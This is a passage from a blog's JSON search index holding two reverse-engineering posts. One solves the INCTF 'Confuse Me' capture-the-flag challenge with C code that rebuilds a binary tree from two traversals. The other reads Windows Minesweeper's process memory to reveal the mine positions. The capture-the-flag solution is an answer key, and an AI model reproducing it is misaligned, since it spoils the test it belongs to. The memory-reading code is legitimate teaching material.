n); if (pos != 0) check(str, answer+1, pos); if (pos != n-1) check(str+pos+1, answer+pos+1, n-pos-1); match(answer[0]); } int main() { char magic[] = \u0026#34;MGNCHXWIZDJAOKPELYSFUTV\u0026#34;; char answer[1024]; // read answer of length atleast 23 bytes  check(magic, answer, 0x17); if (count == 0x17) { // print flag  } else { // print \u0026#34;Nope\u0026#34;  } } Let the value of count be 0x16. So we need to match only one character. Since count is 0x16, so the character expected is buf[count] = \u0026lsquo;A\u0026rsquo;. So this must be the first character of answer.\nThe routine check finds the offset of the first character in the answer and splits the search into two halves. The first half must be a permutation of magic[0..pos] and the second half must be a permutation of magic[pos+1..0x16]. Now answer is \u0026lsquo;A\u0026rsquo; :: {MGNCHXWIZDJ} :: {OKPELYSFUTV}.\nNow we need to split using \u0026lsquo;Y\u0026rsquo; because it\u0026rsquo;s the second last match - \u0026lsquo;A\u0026rsquo; :: {MGNCHXWIZDJ} :: \u0026lsquo;Y\u0026rsquo; :: {OKPEL} :: {FSTUV}, and so on.\nTo simplify, lets see the first five characters of magic and buf.\nmagic[:5] = \u0026ldquo;MGNCH\u0026rdquo; buf[:5] = \u0026ldquo;MNGHC\u0026rdquo;\nWe can make a binary tree\n C / \\ {MGN} H C is matched last, preceded by H which is preceded by G. We can observe that the character that is matched is the root of a subtree denoted by the magic string as\n{left subtree of R} :: R :: {Right Subtree of R}\n C / \\ G H / \\ M N Therefore the required input is the preorder traversal of the binary tree where \u0026lsquo;magic\u0026rsquo; denotes the inorder traversal and \u0026lsquo;buf\u0026rsquo; denotes the postorder traversal\n#include \u0026lt;stdio.h\u0026gt; char magic[] = \u0026#34;MGNCHXWIZDJAOKPELYSFUTV\u0026#34;; char buffer[] = \u0026#34;MNGHCWZIJDXOPKLESUVTFYA\u0026#34;; char answer[sizeof magic]; int last = 0x16; /* * Observation * --------------------------------------------------------------------------- * the count must be 0x17 * Let the value of count be 0x16, i.e., the last char of buf * needs to be matched with the input\u0026#39;s first character (backtrack) * and the routine terminates. * the last character of buf is \u0026#39;A\u0026#39; which needs to be the first character * of our input. * With observation, one can find out that the magic string: * \u0026#34;MGNCHXWIZDJAOKPELYSFUTV\u0026#34; is the inorder traversal of a binary tree * and buf:\u0026#34;MNGHCWZIJDXOPKLESUVTFYA\u0026#34; is the postorder traversal of the binary * tree. The valid input is the preorder traversal * --------------------------------------------------------------------------- */ void solve(int low, int high, int index) { if (low == high) { answer[index] = magic[low]; --last; } else { char root = buffer[last]; int pos = low; for (; pos \u0026lt;= high; ++pos) { if (magic[pos] == root) { last--; break; } } answer[index] = root; solve(pos+1, high, pos-low+index+1); solve(low, pos-1, index+1); } } int main(int argc, char const *argv[]) { solve(0, last, 0); printf(\u0026#34;[*] %s\\n\u0026#34;, answer); return 0; } And here\u0026rsquo;s the output\n","date":"2018-09-12T00:00:00+05:30","permalink":"http://localhost:1313/post/inctf-confuse-me/","title":"INCTF - Confuse Me"},{"content":"We all know about Minesweeper. Its all about random numbers (pseudorandom though). Is it possible to win every time ?\nYes it is. Let\u0026rsquo;s check it out\nOpen the binary in x32dbg.\nFrom 0x10036C2, things become interesting.\n; .... mov dword ptr ds:[\u0026lt;n_mines\u0026gt;], eax put_mines: push dword ptr ds:[0x1005334] ; argument call rand_mod ; rand() % argument push dword ptr ds:[0x1005338] mov esi, eax inc esi call rand_mod inc eax mov ecx, eax shl ecx, 0x5 test byte ptr ds:[ecx + esi + \u0026lt;mines\u0026gt;], 0x80 jne put_mines shl eax, 0x5 lea eax, dword ptr ds:[eax + esi + \u0026lt;mines\u0026gt;] or byte ptr ds:[eax], 0x80 dec dword ptr ds:[\u0026lt;n_mines\u0026gt;] jne put_mines ; ... Dump the memory at 0x1005338 and run the executable. You can see that the 0x1005338 is an 2D array where each row is 32 bytes.\nThe field is bounded by bytes of value 0x10.\nMines correspond to 0x8F and other areas are marked by 0xf bytes.\nNow we can just read the memory at 0x1005338 and find out the position of mines :)\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;tlhelp32.h\u0026gt; /* * Author : x0r19x91 * Revealing the mines - Minesweeper */ #pragma comment(lib, \u0026#34;user32\u0026#34;)  typedef LONG (WINAPI* NT_ROUTINE) (HANDLE); int main(int argc, char** argv) { int n_mines = 0, width, height, i; char* base; char row[32]; HWND hWnd, hProcSnap, hProcess = (HANDLE)-1; char* exe_name; PROCESSENTRY32 pInfo; HANDLE hNt; NT_ROUTINE NtSuspendProcess, NtResumeProcess; exe_name = \u0026#34;winmine.exe\u0026#34;; if (argc == 2) { exe_name = strlwr(argv[1]); } // already loaded, just return module base  hNt = LoadLibrary(\u0026#34;ntdll.dll\u0026#34;); NtSuspendProcess = (NT_ROUTINE) GetProcAddress(hNt, \u0026#34;NtSuspendProcess\u0026#34;); NtResumeProcess = (NT_ROUTINE) GetProcAddress(hNt, \u0026#34;NtResumeProcess\u0026#34;); hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); Process32First(hProcSnap, \u0026amp;pInfo); do { if (strstr(strlwr(pInfo.szExeFile), exe_name)) { hProcess = OpenProcess(PROCESS_SUSPEND_RESUME | PROCESS_VM_READ, FALSE, pInfo.th32ProcessID); printf(\u0026#34;[*] Found Minesweeper (%s) ... PiD = %d\\n\u0026#34;, pInfo.szExeFile, pInfo.th32ProcessID); break; } } while (Process32Next(hProcSnap, \u0026amp;pInfo)); CloseHandle(hProcSnap); if (! hProcess) { printf(\u0026#34;[-] Failed to open process !!\\n\u0026#34;); exit(2); } else if (hProcess == (HANDLE)-1) { printf(\u0026#34;[ Usage ]\\n%s [minesweeper_binary_name]\\n\u0026#34;, *argv); printf(\u0026#34;\\n[ Note ]\\nExecute this program only after starting minesweeper\\n\u0026#34;); printf(\u0026#34; If no argument is provided, the program searches for WinMine.exe\\n\u0026#34;); printf(\u0026#34;\\n[~ x0r19x91 ~]\\n\u0026#34;); exit(0); } printf(\u0026#34;[*] Waiting for Minesweeper window to appear ...\\n\u0026#34;); while (!(hWnd = FindWindow(\u0026#34;Minesweeper\u0026#34;, \u0026#34;Minesweeper\u0026#34;))); printf(\u0026#34;[*] HWnd : %p\\n\u0026#34;, (long*) hWnd); while (!n_mines) ReadProcessMemory(hProcess, (char*) 0x1005330, \u0026amp;n_mines, 4, NULL); NtSuspendProcess(hProcess); ReadProcessMemory(hProcess, (char*) 0x1005334, \u0026amp;width, 4, NULL); ReadProcessMemory(hProcess, (char*) 0x1005338, \u0026amp;height, 4, NULL); printf(\u0026#34;[*] # mines : %d\\n\u0026#34;, n_mines); printf(\u0026#34;[*] Dimensions : %d x %d\\n\u0026#34;, height, width); printf(\u0026#34;[ Note ] X represents Mine\\n\u0026#34;); printf(\u0026#34;[*] Mine Layout ...\\n\u0026#34;); base = (char*) 0x1005360; while (height--) { ReadProcessMemory(hProcess, base, row, 32, NULL); base += 0x20; i = 1; do { if ((row[i] \u0026amp; 0xffu) == 0x8f) row[i] = \u0026#39;X\u0026#39;; else row[i] = \u0026#39;.\u0026#39;; } while (row[++i] != 0x10); printf(\u0026#34;%.*s\\n\u0026#34;, width, row+1); } NtResumeProcess(hProcess); WaitForSingleObject(hProcess, -1); CloseHandle(hProcess); } ","date":"2018-06-29T00:00:00+05:30","permalink":"http://localhost:1313/post/minesweeper-revealing-the-mines/","title":"Minesweeper - Revealing the Mines"}]